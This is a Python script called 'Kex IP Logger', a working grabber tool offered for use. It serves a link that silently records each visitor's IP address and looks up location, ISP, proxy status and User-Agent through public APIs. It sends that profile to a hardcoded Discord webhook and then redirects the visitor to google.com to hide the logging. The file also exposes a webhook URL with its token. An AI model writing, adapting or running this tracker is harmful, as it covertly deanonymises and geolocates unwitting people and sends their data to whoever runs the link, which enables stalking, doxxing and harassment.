# Kex IP Logger - Pure & Simple
# Just grab IP and all available info - no fake shit

from http.server import BaseHTTPRequestHandler, HTTPServer
import requests, json, socket, re

config = {
    "webhook": "https://discordapp.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
}

class IPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get REAL IP
            ip = self.client_address[0]
            forwarded = self.headers.get('X-Forwarded-For', ip)
            real_ip = forwarded.split(',')[0].strip()
            
            # Get ALL IP info from multiple APIs
            info = {}
            
            # ip-api.com - most reliable
            try:
                r = requests.get(f"http://ip-api.com/json/{real_ip}?fields=66846719", timeout=5)
                data = r.json()
                info.update(data)
            except:
                pass
            
            # ipinfo.io backup
            try:
                r = requests.get(f"https://ipinfo.io/{real_ip}/json", timeout=5)
                data = r.json()
                info.update(data)
            except:
                pass
            
            # Get abuse info
            try:
                r = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={real_ip}", 
                               headers={"Key": "YOUR_API_KEY"}, timeout=5)
                abuse = r.json()
                info["abuse_score"] = abuse.get("data", {}).get("abuseConfidenceScore", 0)
            except:
                pass
            
            # Build simple clean embed
            embed = {
                "username": "Kex Logger",
                "content": f"**IP LOGGED: {real_ip}**",
                "embeds": [{
                    "title": "IP Information",
                    "color": 0xFF0000,
                    "fields": [
                        {"name": "IP Address", "value": real_ip, "inline": True},
                        {"name": "ISP", "value": info.get("isp", info.get("org", "Unknown")), "inline": True},
                        {"name": "Country", "value": info.get("country", info.get("country_name", "Unknown")), "inline": True},
                        {"name": "Region", "value": info.get("region", info.get("regionName", "Unknown")), "inline": True},
                        {"name": "City", "value": info.get("city", "Unknown"), "inline": True},
                        {"name": "Timezone", "value": info.get("timezone", "Unknown"), "inline": True},
                        {"name": "Lat/Long", "value": f"{info.get('lat', info.get('loc', '0,0'))}", "inline": True},
                        {"name": "Postal", "value": info.get("zip", info.get("postal", "Unknown")), "inline": True},
                        {"name": "ASN", "value": info.get("as", info.get("asn", "Unknown")), "inline": True},
                        {"name": "Mobile", "value": str(info.get("mobile", False)), "inline": True},
                        {"name": "Proxy/VPN", "value": str(info.get("proxy", info.get("vpn", False))), "inline": True},
                        {"name": "Hosting", "value": str(info.get("hosting", False)), "inline": True},
                        {"name": "Abuse Score", "value": str(info.get("abuse_score", 0)), "inline": True},
                        {"name": "User-Agent", "value": self.headers.get('User-Agent', 'Unknown')[:100], "inline": False},
                    ]
                }]
            }
            
            # Send to webhook
            requests.post(config["webhook"], json=embed)
            
            # Redirect to something harmless
            self.send_response(302)
            self.send_header('Location', 'https://google.com')
            self.end_headers()
            
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error")

# Run server
def run():
    server = HTTPServer(('0.0.0.0', 8080), IPHandler)
    server.serve_forever()

if __name__ == "__main__":
    run()
